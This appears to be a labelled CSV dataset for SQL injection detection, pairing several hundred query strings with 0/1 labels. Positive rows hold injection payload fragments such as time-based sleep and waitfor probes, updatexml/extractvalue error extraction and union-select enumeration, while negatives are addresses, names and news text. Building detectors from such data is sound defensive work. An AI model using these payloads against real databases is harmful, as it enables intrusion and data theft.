Query,Label
"['row 1045,7562 > select count * , concat 0x7171706a71 , select elt = 1045,1 ,0x717a767a71 , floor rand * x select union seelct unino select union select group x kdxg like kdxg']",1.0
50422961s,0.0
peralejos de abajo,0.0
doctor attending aap conference reinforced complexity topic,0.0
"1|| select xhqy = union select null , null --",1.0
select * ever setting like % clean %,0.0
praxis,0.0
= * estb like estb,1.0
= select count * tablenames ; --,1.0
"boolean mode = select count * domaindomains t1 , domaincolumns t2 , domaintables t3 --",1.0
"select orderstearsrid , employeesbus , employeesskin ordersright join employee ordersemployeeid = employeespromisedid order orderslookid",0.0
"= select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 --",1.0
['waitfor delay 0:0:5 luIp like ludp'],1.0
edlene,0.0
"['1|| selecat xpjg = elt = 6644,6644 ||']",1.0
rlike select case = else 0x28 end trzi = trzi,1.0
select foot uncle union select given tale order,0.0
= qqpjq|| select case else end rdb $ database ||qzvzq =,1.0
sertino,0.0
-2131 char +char +char +char +char + select case = char else char end +char +char,1.0
matney,0.0
select * origin sudden = least least = solid,0.0
"= select count * generate_series 1,5000000 ctrr = ctrr",1.0
"['-8344 = convert int , select char +char +char +char +char + select case = char else czhar end +char']",1.0
select case = else * select mastersysdatabases end --,1.0
rocquemore @ spainbbum,0.0
"= select count * generate_series 1,5000000 =",1.0
= = qqpjq|| select case else end rdb $ database ||qzvzq --,1.0
sdnd =,1.0
"glorieta farmaceutico perez jimenez ,",0.0
"% select case = regexp_substring repeat right char ,0 ,500000000 , null else char ||char ||char ||char end information_schemasystem_users % =",1.0
"calle teresa pamies bertran ,",0.0
bisbe gonyalons 12f,0.0
seymour @ evelingn,0.0
['select * uKer id = { { = --'],1.0
select announced visit left join,0.0
"% char ||char ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , null % =",1.0
select * fetch first row,0.0
c/ buenos aire s/n 6b,0.0
"& apos ; great news million trick-or-treaters set take neighborhood , according u",0.0
"['= updatexml , concat 0x2e,0x7171706a71 , select elt = 3393,1 ,0x717a767a71 ,161 --']",1.0
select avg price,0.0
fe4r0g6ent8,0.0
,0.0
-4148 % = * % =,1.0
b5rr1mbada,0.0
select case = else * select mysqldb end #,1.0
"-7008 union select 9080,9080,9080 #",1.0
"procedure analyse extractvalue , concat 0x5c , benchmark , md5 0x52515a50 ,1",1.0
select * progress instrument = crack freedom = something pas =,0.0
msug = sleep #,1.0
ajenador,0.0
"= select count * all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 cqrp = cqrp",1.0
"c/ san cristobal , s/n",0.0
select * dollar political 1996-07-01 1996-07-31,0.0
"= = select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 --",1.0
82160553e,0.0
wwkw = = --,1.0
"meanwhile , former chief reporter neville thurlbeck former reporter james weatherup oversaw surveillance m pawlby & apos ; movement",0.0
"extractvalue , concat 0x5c,0x7171706a71 , select elt = 1297,1 ,0x717a767a71 pebw like pebw",1.0
['dzgf ='],1.0
91565705z,0.0
% = cast chr ||chr ||chr ||chr ||chr || select case = else end : :text|| chr ||chr ||chr ||chr ||chr numeric % =,1.0
xiangsen,0.0
pche,0.0
antero,0.0
['-4166 % union seleoct --'],1.0
san martn mudrin,0.0
% = % =,1.0
"suffered broken arm first , infection developed spread brain , creating hematoma would affect rest life",0.0
select top * race,0.0
sedano montanyola,0.0
['1|| select ezse duaP ='],1.0
amengual casanova,0.0
archie,0.0
jtfx =,1.0
rhvm =,1.0
-3998 =,1.0
"['union select null , null , null , null , ull , null , null , null , null , null #']",1.0
select top percent * difficult,0.0
"% = select count * generate_series 1,5000000 % =",1.0
swwb =,1.0
"fire service arrived , flame already bursting window",0.0
"updatexml , concat 0x2e,0x7171706a71 , select elt = 3393,1 ,0x717a767a71 ,1161 ygzq like ygzq",1.0
select * stick natural like % anything %,0.0
"select select count * , concat 0x7171706a71 , select elt = 9173,1 ,0x717a767a71 , floor rand * x information_schemacharacter_sets group x ymad like ymad",1.0
select weak,0.0
=,1.0
"infancy conforms nobody : conform , one babe commonly make four five adult prattle play",0.0
select count moonid shoulder,0.0
"% = select count * domaindomains t1 , domaincolumns t2 , domaintables t3 --",1.0
"-9014 % union select 4211,4211,4211,4211,4211,4211 #",1.0
-7764 =,1.0
"['select * generate_series 7237,7237 , case = else nd limit --']",1.0
"select coat , fought , cost avoid left join order menmarriedid = exchangewere order finestrecognize",0.0
"['= select count * genrate_series 1,5000000 --']",1.0
985e+15,0.0
nalia,0.0
"['1|| select bmyt dual = = like abcdCfg , upper hex randomblob 500000000/2 ||']",1.0
select * dried worse =,0.0
"% extractvalue , concat 0x5c,0x7171706a71 , select elt = 7982,1 ,0x717a767a71 % =",1.0
select log10 ;,0.0
select * position electricity like pain %,0.0
select count * lunch,0.0
gelo,0.0
['= smlect pg_sleep --'],1.0
"['elt = , selep #']",1.0
puente del congosto,0.0
"% char ||char ||char ||char = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null % =",1.0
rolleck @ soybuenomm,0.0
"exploring , next decade , move system driver pay per mile road roll",0.0
1+ select ankx =,1.0
"['1|| select alxi = = benchmark , md 0x6d457153 #']",1.0
"= like abcdefg , upper hex randomblob 500000000/2",1.0
select top * chart moment = house select * nearly,0.0
"= select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 agsi = agsi",1.0
"instruction office protection constitution bfv , germany & apos ; domestic intelligence agency , mission photograph rooftop u outpost , located le 5km european central bank bundesbank",0.0
dlar,0.0
"c/ la figuera ,",0.0
,0.0
musi @ inmobiliariahangarvn,0.0
['select case = else * select msatersysdatabases end --'],1.0
select * arrange function like accept %,0.0
eibf = = utl_inaddrget_host_address chr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr --,1.0
moskuna @ sitcplaye,0.0
"= select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 niro = niro",1.0
01246496b,0.0
"= updatexml , concat 0x2e,0x7171706a71 , select elt = 3393,1 ,0x717a767a71 ,1161 --",1.0
"-7382 make_set = 4330,4330 tvaz like tvaz",1.0
"['-5379 union seelct 4294,4294,4294 --']",1.0
hayman,0.0
"= select count * sysibmsystables t1 , sysibmsystables t2 , sysibmsystables t3 --",1.0
select largest,0.0
select * user id = + $ + % \ = --,1.0
,0.0
tubalcan,0.0
"elt = 4249,7259 kbkz = kbkz",1.0
"extractvalue , concat 0x5c,0x7171706a71 , select elt = 1297,1 ,0x717a767a71 gknn like gknn",1.0
['boolean Mode select * select sleep sddo #'],1.0
"select productname , unitprice * unitsinstock + isnull unitsonorder , product ;",0.0
% union select null #,1.0
1+ select hcqf = = * +,1.0
"% select select count * , concat 0x7171706a71 , select elt = 9067,1 ,0x717a767a71 , floor rand * x information_schemacharacter_sets group x % =",1.0
,0.0
"select adddate 2017-06-15 09:34:21 , interval -3 hour ;",0.0
['hqt = waitfor delay 0:0:5 --'],1.0
sabedora,0.0
"['cayl regexp_substring repeat right char ,0 ,500000000 , null =']",1.0
queila,0.0
846e+15,0.0
,0.0
c/ florida 1b,0.0
"call regexp_substring repeat right char ,0 ,500000000 , null yzjl like yzjl",1.0
select * lamp form like pick %,0.0
"c/ quintana , 13h",0.0
"plaza movimiento ciudadano ,",0.0
select * biggest,0.0
"select apart , single , remarkable fox activity null",0.0
update refused set dance = jobwhere worth = sister,0.0
46760006v,0.0
select avg wrote straw select sum love,0.0
almirante,0.0
fonterosa vjar,0.0
"= dbms_pipereceive_message chr ||chr ||chr ||chr ,5 --",1.0
select file wp_sm_sync,0.0
"% union select null , null , null , null , null , null , null , null , null , null #",1.0
select * notice = steep fetch first row,0.0
select bright nation union,0.0
"select case = regexp_substring repeat left crypt_key char ||char ||char , null ,0 ,500000000 , null else char ||char ||char ||char end value fsvr = fsvr",1.0
"-5509 % union select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066 --",1.0
clever,0.0
"select * equipment order rhythm , least",0.0
['= select pig_sleep'],1.0
barron,0.0
"select * user id = + \ union select null , @ @ version --",1.0
brcena de pie de concha,0.0
=,1.0
"-6632 union select 4073,4073,4073,4073,4073,4073,4073,4073 --",1.0
"['= conver int , select chai +char +char +char +char + select case = char else char end +char +char +char +char +char qtfl = qtfl']",1.0
vilaller,0.0
brogley,0.0
% =,1.0
"['% elDt = , sleep #']",1.0
"select post_id , meta_key , meta_value wp_postmeta post_id order meta_id asc",0.0
select * customersbackup2017 backupmdb customer ;,0.0
"['select * select * select concat 0x7171706a71 , select elt = 3484,1 ,0x717a767a17,0x78 , , -- tzry']",1.0
villarejo-periesteban,0.0
sariena,0.0
"crossley-holland , translated beowulf anglo-saxon well writing penguin book norse myth british folk tale , said : & quot ; may well intention better keep well sight",0.0
['select case = else 1/ silect end --'],1.0
"plaza pea gudina , ,",0.0
zapateo,0.0
"paseo marinero luis de torres , , 4e",0.0
& apos ; push vehicle river mud,0.0
"['jntr = select elect count * , concat 0x7171706a71 , select elt = 9067,1 ,0x717a767a71 , floor rand * x information_schemacharacter_sets group x --']",1.0
"['= select count * all_users t1 , all_users tA2 , all_users t3 , all_users t4 , all_users t5 ewwi = ewwi']",1.0
"['% = select coutn * generate_series 1,5000000 % =']",1.0
"xovu = = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 --",1.0
gdie = rlike select case = else 0x28 end --,1.0
horcajo de montemayor,0.0
-5803 = = utl_inaddrget_host_address chr ||chr ||chr ||chr ||chr || select case = else end dual ||,1.0
"test , adopted , would applied criterion aimed preventing 457s used fill unskilled position back door way move family friend australia",0.0
758e+15,0.0
c/ atlantico,0.0
-2912 order --,1.0
['= utl_inaddrget_host_address Whr ||chr ||chr ||chr ||chr || select case = else end dual ||chr ||chr ||chr ||chr ||chr iuao = iuao'],1.0
tsge =,1.0
margheti,0.0
select * building shallow = aloud fetch first row,0.0
29142280s,0.0
espejo jauregui,0.0
"select highest , grandmother+ , + beat+ + pole+ , + shop castle verb",0.0
"najc = procedure analyse extractvalue , concat 0x5c , benchmark , md5 0x52515a50 ,1 --",1.0
ateniesa,0.0
"updatexml , concat 0x2e,0x7171706a71 , select elt = 3393,1 ,0x717a767a71 ,1161 qcsi = qcsi",1.0
"['= = select count * generate_serieus 1,5000000 --']",1.0
= = #,1.0
"% = benchmark , md5 0x76555642 % =",1.0
"umbria , ,",0.0
"['-4165 = union select 1772,1772,1772,1772,17c72,1772,1772,1772 --']",1.0
['select cate = else 1/ select end --'],1.0
"boolean mode row 1045,7562 > select count * , concat 0x7171706a71 , select elt = 1045,1 ,0x717a767a71 , floor rand * x select union select union select union select group x #",1.0
rlike select * select sleep sgvo fkmh = fkmh,1.0
,0.0
mcglynn,0.0
=,1.0
['select case = esle * select mysqldb end #'],1.0
select top percent * measure select * stiff fetch first percent row onlyselect top * paint,0.0
sobrecejo,0.0
select afternoon,0.0
suchet @ ciaplasttel,0.0
karola5,0.0
santa eulalia de gllego,0.0
union select,1.0
931e+15,0.0
['% = --'],1.0
fechner_rabel @ fortelingenieriasd,0.0
-2429 % =,1.0
,0.0
rlike select case = else 0x28 end qfhv = qfhv,1.0
select count saw,0.0
"['rrms = union selct null , null , null , null , null , null , null , null --']",1.0
425e+15,0.0
"['procedure analyse extractvalue , concat mx5c,0x7171706a71 , select case = else end ,0x717a767a71 ,1 wqme = wqme']",1.0
select * evidence like memory %,0.0
"calle virgen de la fuensanta , 3b",0.0
"-8002 union select 6647,6647,6647 --",1.0
baqu,0.0
select count government powder,0.0
,0.0
"['= = select count * domaindomains t1 , domaincolumns Lt2 , domaintables t3 --']",1.0
"= select count * domaindomains t1 , domaincolumns t2 , domaintables t3 gzlz like gzlz",1.0
"['% = select count * sysibmsystables t1 , sysibmsystables jt2 , sysibmsystables t3 --']",1.0
username like %,1.0
"[', select case = else 1/ selbct end']",1.0
select farther two right join,0.0
=,1.0
5v1s582a,0.0
oestreic,0.0
"= dbms_pipereceive_message chr ||chr ||chr ||chr ,5 vxqs = vxqs",1.0
piesa-diestel @ haciatz,0.0
gianina,0.0
select * select sleep fzno,1.0
"['% row 6237,7469 > select count * , concat 0x7171706a71 , select elh = 6237,1 ,0x717a767a71 , floor rand * x select union select union select union select grop x % =']",1.0
"['xebl = = select conut * generate_series 1,5000000 --']",1.0
"% = select count * sysusers sys1 , sysusers sys2 , sysusers sys3 , sysusers sys4 , sysusers sys5 , sysusers sys6 , sysusers sys7 % =",1.0
forua,0.0
"['elt = , sleep acdu = aBdu']",1.0
waitfor delay 0:0:5 % =,1.0
['= qqpjq|| select case else end rdb $ database ||qzvzq ehq like pehq'],1.0
sleep bmnf like bmnf,1.0
"boolean mode elt = , sleep #",1.0
", still word friend , online scrabble-type game actor alec baldwin playing smartphone famously booted american airline jet refusing turn device plane parked gate",0.0
,0.0
basilisa,0.0
['-8812 = # dlfr'],1.0
"select count * generate_series 1,5000000 dros = dros",1.0
select top * giant tomorrow = lunch select * sudden,0.0
"select case = regexp_substring repeat right char ,0 ,500000000 , null else char ||char ||char ||char end information_schemasystem_users =",1.0
"elt = 5953,1",1.0
['jQoco ='],1.0
select window,0.0
"select period_add , ;",0.0
select * productswhere productname carnarvon tiger chef antons cajun seasoning,0.0
iago,0.0
['% = #'],1.0
santo domingo de la posadas,0.0
"char ||char ||char ||char = regexp_substring repeat right char ,0 ,5000000000 , null =",1.0
"select post_id , meta_key , meta_value wp_postmeta post_id order meta_id asc",0.0
select * climate,0.0
select * strange theory select engineer slave,0.0
mohv = select * select sleep sddo #,1.0
select * divide beyond = invented handle = fellow,0.0
02650843r,0.0
1+ select hkrg =,1.0
ziga,0.0
select * flew flame like %,0.0
select yes widely union select independent order native,0.0
saetero farrer,0.0
"['union select null , null , null , nuBl , null #']",1.0
"jxvv = elt = , sleep --",1.0
"= select case = regexp_substring repeat right char ,0 ,500000000 , null else char ||char ||char ||char end information_schemasystem_users --",1.0
"select * low order helpful ,",0.0
['select * user di = < @ = --'],1.0
"select empty , wagon+ , + or+ + dropped+ , + smooth crowd",0.0
"select * user id = $ = union select , @ @ version --",1.0
,0.0
"= like abcdefg , upper hex randomblob 500000000/2 --",1.0
select * seldom led = every city = fourth,0.0
select min spell paid essential,0.0
team & apos ; eye goal must considerably improved,0.0
% rlike select * select sleep vwyq #,1.0
,0.0
shiner-rangda @ guerrerodelbienestarcr,0.0
"select * user id = + $ + union select null , @ @ version --",1.0
"elt = 7826,7826 qcro = qcro",1.0
% = cast chr ||chr ||chr ||chr ||chr || select case = else end : :text|| chr ||chr ||chr ||chr ||chr numeric % =,1.0
"['et = , sleep']",1.0
hatz,0.0
['char +char +char +char +char + select case = char else char end +char +char +fchar +char +char'],1.0
"paseo francisco mir berlanga , 12-e",0.0
,0.0
nyui =,1.0
"-2790 % union select 5070,5070 #",1.0
